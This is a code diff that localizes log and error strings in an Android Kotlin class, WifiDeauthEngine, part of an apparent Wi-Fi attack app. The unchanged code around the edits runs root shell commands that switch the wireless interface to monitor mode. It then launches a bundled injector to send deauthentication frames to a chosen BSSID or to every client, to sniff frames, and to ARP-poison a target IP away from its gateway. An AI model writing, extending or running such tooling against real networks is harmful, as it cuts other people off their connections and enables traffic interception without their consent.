@@ -8,6 +8,8 @@ import java.io.BufferedReader
 import java.io.File
 import java.io.InputStreamReader
 import java.util.concurrent.atomic.AtomicInteger
+import xin.ctkqiang.deauthctrl.L10n
+import xin.ctkqiang.deauthctrl.R
 
 /** 注入日志行 */
 data class DeauthLogLine(val timeMs: Long, val text: String)
@@ -84,7 +86,7 @@ class WifiDeauthEngine private constructor(private val context: Context) {
      * 可能触发系统的 root 授权弹窗,由用户在 UI 显式点击触发。
      */
     fun probeTools() {
-        appendLog("▸ 探测 root 与工具链…")
+        appendLog("▸ " + L10n.get(R.string.mgr_deauth_log_probing))
         val rootOut = runSuLines(listOf("id -u"), timeoutMs = 4000) { }
         val rootOk = rootOut.lines.lines().any { it.trim() == "0" }
         val whichOut = if (rootOk) runSuLines(listOf("which nexutil aireplay-ng iw 2>/dev/null"), timeoutMs = 4000) { } else null
@@ -109,17 +111,37 @@ class WifiDeauthEngine private constructor(private val context: Context) {
             monitorSupported = monitorSupported,
             bundledInjector = hasBundledInjector(),
             detail = buildString {
-                append(if (rootOk) "root 已授予" else "无 root(su 不可用)")
-                append(" · 接口 ${iface ?: "未发现 wlan"}")
-                append(" · 监控模式 ${if (monitorSupported) "支持" else "不支持"}")
-                append(" · 注入器 ${if (hasBundledInjector()) "内置原生" else "未内置"}")
-                if (!rootOk) append(" · 注入在无 root 的 stock Android 上不可实现(SELinux 拒绝 raw socket)")
+                append(
+                    if (rootOk) L10n.get(R.string.mgr_deauth_probe_root_granted)
+                    else L10n.get(R.string.mgr_deauth_probe_no_root),
+                )
+                append(
+                    " · " + L10n.get(
+                        R.string.mgr_deauth_probe_iface,
+                        iface ?: L10n.get(R.string.mgr_deauth_probe_iface_none),
+                    ),
+                )
+                append(
+                    " · " + L10n.get(
+                        R.string.mgr_deauth_probe_monitor,
+                        if (monitorSupported) L10n.get(R.string.mgr_deauth_probe_monitor_supported)
+                        else L10n.get(R.string.mgr_deauth_probe_monitor_unsupported),
+                    ),
+                )
+                append(
+                    " · " + L10n.get(
+                        R.string.mgr_deauth_probe_injector,
+                        if (hasBundledInjector()) L10n.get(R.string.mgr_deauth_probe_injector_bundled)
+                        else L10n.get(R.string.mgr_deauth_probe_injector_missing),
+                    ),
+                )
+                if (!rootOk) append(" · " + L10n.get(R.string.mgr_deauth_probe_no_root_note))
             },
         )
         _session.value = _session.value.copy(probe = probe)
-        appendLog("▸ 探测完成: ${probe.detail}")
+        appendLog("▸ " + L10n.get(R.string.mgr_deauth_log_probe_done, probe.detail))
         if (!probe.bundledInjector && probe.rootGranted && !probe.aireplay) {
-            appendLog("▸ 未内置注入器且缺少 aireplay-ng —— 安装 aircrack-ng Android 移植版(如 kriswebdev/android_aircrack)到 PATH 后重试")
+            appendLog("▸ " + L10n.get(R.string.mgr_deauth_log_aireplay_missing))
         }
     }
 
@@ -134,14 +156,14 @@ class WifiDeauthEngine private constructor(private val context: Context) {
      * @return null 表示会话已启动;非 null 为失败原因
      */
     fun start(targetBssid: String, channel: Int, clientMac: String?, count: Int, intervalMs: Long): String? {
-        if (_session.value.running) return "注入会话已在运行"
+        if (_session.value.running) return L10n.get(R.string.mgr_deauth_err_session_running)
         val macRe = Regex("^([0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}$")
-        if (!macRe.matches(targetBssid)) return "BSSID 格式无效: $targetBssid"
-        clientMac?.let { if (!macRe.matches(it)) return "客户端 MAC 格式无效: $it" }
+        if (!macRe.matches(targetBssid)) return L10n.get(R.string.mgr_deauth_err_bssid_invalid, targetBssid)
+        clientMac?.let { if (!macRe.matches(it)) return L10n.get(R.string.mgr_deauth_err_client_invalid, it) }
         val probe = _session.value.probe
-        if (probe == null || !probe.rootGranted) return "无 root —— 注入在无 root 的 stock Android 上不可实现"
-        if (!probe.monitorSupported) return "芯片/固件不支持监控模式(需 Nexmon/QCACLD 类补丁固件)"
-        val iface = probe.iface ?: return "未发现无线接口"
+        if (probe == null || !probe.rootGranted) return L10n.get(R.string.mgr_deauth_err_no_root_inject)
+        if (!probe.monitorSupported) return L10n.get(R.string.mgr_deauth_err_monitor_required)
+        val iface = probe.iface ?: return L10n.get(R.string.mgr_deauth_err_no_iface)
 
         stopRequested = false
         framesSent.set(0)
@@ -160,7 +182,7 @@ class WifiDeauthEngine private constructor(private val context: Context) {
                 append(" $monitorIface")
             }
         } else {
-            return "无可用注入器(内置注入器缺失且 aireplay-ng 未安装)"
+            return L10n.get(R.string.mgr_deauth_err_no_injector)
         }
         val cmd = buildList {
             add("set -e")
@@ -175,7 +197,15 @@ class WifiDeauthEngine private constructor(private val context: Context) {
             add(injectCmd)
         }.joinToString("\n") + "\n"
 
-        appendLog("▸ 注入会话启动 · 目标 $targetBssid · 信道 $channel · ${clientMac ?: "广播(全部客户端)"} · $iface")
+        appendLog(
+            "▸ " + L10n.get(
+                R.string.mgr_deauth_log_inject_started,
+                targetBssid,
+                channel,
+                clientMac ?: L10n.get(R.string.mgr_deauth_client_broadcast),
+                iface,
+            ),
+        )
         Thread({
             try {
                 val su = ProcessBuilder("su").redirectErrorStream(true).start()
@@ -198,12 +228,12 @@ class WifiDeauthEngine private constructor(private val context: Context) {
                 }
                 runCatching { reader.close() }
             } catch (t: Throwable) {
-                appendLog("✖ 注入会话异常: ${t.message}")
+                appendLog("✖ " + L10n.get(R.string.mgr_deauth_log_inject_exception, t.message ?: t.javaClass.simpleName))
             } finally {
                 suProcess = null
                 restoreManagedMode(iface)
                 _session.value = _session.value.copy(running = false, phase = "已停止 · 接口已恢复 managed")
-                appendLog("▸ 注入会话结束 · 共注入 ${framesSent.get()} 帧")
+                appendLog("▸ " + L10n.get(R.string.mgr_deauth_log_inject_ended, framesSent.get()))
             }
         }, "wifi-deauth-engine").start()
         return null
@@ -224,17 +254,17 @@ class WifiDeauthEngine private constructor(private val context: Context) {
      * root + 监控模式前提与注入模式相同;无 root 设备上返回失败原因。
      */
     fun startCapture(channel: Int): String? {
-        if (_session.value.running) return "会话已在运行"
+        if (_session.value.running) return L10n.get(R.string.mgr_deauth_err_session_active)
         val probe = _session.value.probe
-        if (probe == null || !probe.rootGranted) return "无 root —— 嗅探在无 root 的 stock Android 上不可实现"
-        if (!probe.monitorSupported) return "芯片/固件不支持监控模式"
-        val iface = probe.iface ?: return "未发现无线接口"
+        if (probe == null || !probe.rootGranted) return L10n.get(R.string.mgr_deauth_err_no_root_sniff)
+        if (!probe.monitorSupported) return L10n.get(R.string.mgr_deauth_err_monitor_unsupported)
+        val iface = probe.iface ?: return L10n.get(R.string.mgr_deauth_err_no_iface)
 
         stopRequested = false
         framesSent.set(0)
         _session.value = DeauthSession(running = true, phase = "被动嗅探", probe = probe)
         val injectorPath = extractBundledInjector()
-            ?: return "内置嗅探器缺失"
+            ?: return L10n.get(R.string.mgr_deauth_err_sniffer_missing)
         val cmd = buildList {
             add("set -e")
             if (probe.nexutil) add("nexutil -m2") else add("iw dev $iface set type monitor")
@@ -243,7 +273,7 @@ class WifiDeauthEngine private constructor(private val context: Context) {
             add("$injectorPath capture $iface")
         }.joinToString("\n") + "\n"
 
-        appendLog("▸ 被动嗅探启动 · $iface · 监听信标/探测/去认证帧")
+        appendLog("▸ " + L10n.get(R.string.mgr_deauth_log_sniff_started, iface))
         Thread({
             try {
                 val su = ProcessBuilder("su").redirectErrorStream(true).start()
@@ -260,12 +290,12 @@ class WifiDeauthEngine private constructor(private val context: Context) {
                 if (stopRequested) runCatching { su.destroy() }
                 runCatching { reader.close() }
             } catch (t: Throwable) {
-                appendLog("[!] 嗅探会话异常: ${t.message}")
+                appendLog("[!] " + L10n.get(R.string.mgr_deauth_log_sniff_exception, t.message ?: t.javaClass.simpleName))
             } finally {
                 suProcess = null
                 restoreManagedMode(iface)
                 _session.value = _session.value.copy(running = false, phase = "已停止 · 接口已恢复 managed")
-                appendLog("▸ 嗅探会话结束 · 共解析 ${framesSent.get()} 帧")
+                appendLog("▸ " + L10n.get(R.string.mgr_deauth_log_sniff_ended, framesSent.get()))
             }
         }, "wifi-frame-sniffer").start()
         return null
@@ -282,26 +312,26 @@ class WifiDeauthEngine private constructor(private val context: Context) {
      * - 接口保持 managed 模式(ARP 是二层广播,不需要监控模式)
      */
     fun startArpKick(targetIp: String, gatewayIp: String, count: Int, intervalMs: Long): String? {
-        if (_session.value.running) return "会话已在运行"
+        if (_session.value.running) return L10n.get(R.string.mgr_deauth_err_session_active)
         val probe = _session.value.probe
-        if (probe == null || !probe.rootGranted) return "无 root —— ARP 投毒需要 root"
-        val iface = probe.iface ?: return "未发现无线接口"
+        if (probe == null || !probe.rootGranted) return L10n.get(R.string.mgr_deauth_err_arp_no_root)
+        val iface = probe.iface ?: return L10n.get(R.string.mgr_deauth_err_no_iface)
         val ipRe = Regex("^\\d{1,3}(\\.\\d{1,3}){3}$")
-        if (!ipRe.matches(targetIp)) return "目标 IP 格式无效: $targetIp"
-        if (!ipRe.matches(gatewayIp)) return "网关 IP 格式无效: $gatewayIp"
+        if (!ipRe.matches(targetIp)) return L10n.get(R.string.mgr_deauth_err_target_ip, targetIp)
+        if (!ipRe.matches(gatewayIp)) return L10n.get(R.string.mgr_deauth_err_gateway_ip, gatewayIp)
 
         stopRequested = false
         framesSent.set(0)
         _session.value = DeauthSession(running = true, phase = "ARP 踢人", probe = probe)
         val injectorPath = extractBundledInjector()
-            ?: return "内置引擎缺失"
+            ?: return L10n.get(R.string.mgr_deauth_err_engine_missing)
         val cmd = buildList {
             add("set -e")
             add("ip link set $iface up")
             add("$injectorPath arpkick $iface $targetIp $gatewayIp $count ${intervalMs.coerceAtLeast(100)}")
         }.joinToString("\n") + "\n"
 
-        appendLog("▸ ARP 踢人启动 · 目标 $targetIp · 网关 $gatewayIp · $iface")
+        appendLog("▸ " + L10n.get(R.string.mgr_deauth_log_arp_started, targetIp, gatewayIp, iface))
         Thread({
             try {
                 val su = ProcessBuilder("su").redirectErrorStream(true).start()
@@ -318,11 +348,11 @@ class WifiDeauthEngine private constructor(private val context: Context) {
                 if (stopRequested) runCatching { su.destroy() }
                 runCatching { reader.close() }
             } catch (t: Throwable) {
-                appendLog("[!] ARP 会话异常: ${t.message}")
+                appendLog("[!] " + L10n.get(R.string.mgr_deauth_log_arp_exception, t.message ?: t.javaClass.simpleName))
             } finally {
                 suProcess = null
                 _session.value = _session.value.copy(running = false, phase = "已停止")
-                appendLog("▸ ARP 会话结束 · 共投毒 ${framesSent.get()} 帧 · 目标缓存过期后自动恢复网络")
+                appendLog("▸ " + L10n.get(R.string.mgr_deauth_log_arp_ended, framesSent.get()))
             }
         }, "arp-kick").start()
         return null
@@ -363,7 +393,7 @@ class WifiDeauthEngine private constructor(private val context: Context) {
             runSuLines(listOf("chmod 755 ${dest.absolutePath}"), timeoutMs = 4000) { }
             dest.absolutePath
         } catch (t: Throwable) {
-            appendLog("✖ 注入器解压失败: ${t.message}")
+            appendLog("✖ " + L10n.get(R.string.mgr_deauth_log_extract_failed, t.message ?: t.javaClass.simpleName))
             null
         }
     }
